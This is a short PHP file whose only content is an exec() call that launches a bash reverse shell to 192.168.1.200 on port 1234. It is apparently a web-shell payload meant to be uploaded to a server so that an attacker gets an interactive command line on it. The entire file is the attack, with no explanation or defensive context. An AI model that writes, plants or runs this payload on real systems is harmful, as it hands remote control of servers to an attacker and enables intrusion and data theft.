<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.200/1234 0>&1'");
?>